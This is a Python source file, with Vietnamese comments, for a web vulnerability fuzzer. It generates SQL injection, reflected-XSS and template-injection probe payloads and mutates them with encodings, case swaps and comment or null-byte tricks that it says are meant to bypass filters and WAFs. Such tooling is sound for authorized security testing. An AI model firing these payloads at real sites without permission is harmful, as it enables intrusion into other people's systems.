# ═══════════════════════════════════════════════════════════════
# fuzzer.py — Payload mutation engine
# Dùng bởi: probe_sqli.py, probe_xss.py
# ═══════════════════════════════════════════════════════════════

from urllib.parse import quote

# ── XSS unique marker ────────────────────────────────────────
# String độc nhất — nếu xuất hiện trong response → reflected XSS
XSS_MARKER = "XSSCHECK7a3f9b"

# ── Base payloads ─────────────────────────────────────────────

SQLI_BASE = [
    "'",
    "''",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1 AND 1=2",
    "1' AND '1'='2",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 AND SLEEP(3)",
    "1; WAITFOR DELAY '0:0:3'--",
    "1 AND 1=1",
    "' OR sqlite_version()--",
]

XSS_BASE = [
    # Script tag
    f"<script>{XSS_MARKER}</script>",
    f"<SCRIPT>{XSS_MARKER}</SCRIPT>",
    # Attribute break
    f'"><script>{XSS_MARKER}</script>',
    f"'><script>{XSS_MARKER}</script>",
    # Event handler
    f"<img src=x onerror='{XSS_MARKER}'>",
    f'<img src=x onerror="{XSS_MARKER}">',
    f"<svg onload={XSS_MARKER}>",
    f"<body onload={XSS_MARKER}>",
    # JavaScript URI
    f"javascript:{XSS_MARKER}",
    # Template literal
    f"`{XSS_MARKER}`",
    # Without script tag
    f"<img src={XSS_MARKER}>",
    f"<div>{XSS_MARKER}</div>",
]

SSTI_BASE = [
    "{{7777*7777}}",
    "${7777*7777}",
    "<%= 7777*7777 %>",
    "{{7*7}}",
    "{{config}}",
    "${7*7}",
    "#set($x=7*7)${x}",
]


# ── Mutation functions ────────────────────────────────────────

def _url_encode(p):
    return quote(p, safe="")

def _double_url_encode(p):
    return quote(quote(p, safe=""), safe="")

def _html_encode(p):
    return p.replace("'", "&#39;").replace("\"", "&quot;").replace("<", "&lt;")

def _comment_inject(p):
    return p.replace(" ", "/**/")

def _case_swap(p):
    for old, new in {
        " OR ": " Or ", " AND ": " AnD ",
        "SELECT ": "SeLeCt ", "UNION ": "UnIoN ",
        "SLEEP": "SlEeP", "script": "ScRiPt",
        "onerror": "oNeRrOr", "onload": "oNlOaD"
    }.items():
        p = p.replace(old, new)
    return p

def _null_byte(p):
    return p + "%00"

def _tab_space(p):
    return p.replace(" ", "\t")


def mutate_sqli(payload: str) -> list:
    variants = [payload]
    for fn in [_url_encode, _double_url_encode,
               _comment_inject, _case_swap,
               _null_byte, _tab_space, _html_encode]:
        c = fn(payload)
        if c and c != payload and c not in variants:
            variants.append(c)
    return variants


def mutate_xss(payload: str) -> list:
    """
    Sinh biến thể XSS — tập trung vào bypass filter/WAF.
    Giữ nguyên XSS_MARKER trong mọi biến thể.
    """
    variants = [payload]
    candidates = [
        _url_encode(payload),
        _double_url_encode(payload),
        _case_swap(payload),
        # Thêm null byte trước >
        payload.replace(">", "%00>"),
        # Dùng tab thay space trong tag
        payload.replace(" ", "\t"),
        # Unicode encode <
        payload.replace("<", "\u003c"),
        # Hex encode <
        payload.replace("<", "&#60;"),
    ]
    for c in candidates:
        # Chỉ giữ biến thể vẫn còn marker
        if c and c != payload and XSS_MARKER in c and c not in variants:
            variants.append(c)
    return variants


def get_sqli_payloads() -> list:
    """Trả về SQLi payloads đầy đủ (base + mutations), đã dedup."""
    seen, result = set(), []
    for base in SQLI_BASE:
        for v in mutate_sqli(base):
            if v not in seen:
                seen.add(v)
                result.append(v)
    return result


def get_xss_payloads() -> list:
    """Trả về XSS payloads đầy đủ (base + mutations), đã dedup."""
    seen, result = set(), []
    for base in XSS_BASE:
        for v in mutate_xss(base):
            if v not in seen:
                seen.add(v)
                result.append(v)
    return result


def get_ssti_payloads() -> list:
    """Trả về SSTI payloads (giữ lại để dùng nếu cần)."""
    seen, result = set(), []
    for base in SSTI_BASE:
        if base not in seen:
            seen.add(base)
            result.append(base)
    return result


if __name__ == "__main__":
    sqli = get_sqli_payloads()
    xss  = get_xss_payloads()
    print(f"SQLi payloads: {len(sqli)}")
    print(f"XSS  payloads: {len(xss)}")
    print(f"\nXSS marker: {XSS_MARKER}")
    print("XSS samples:")
    for p in xss[:5]:
        print(f"  {p!r}")
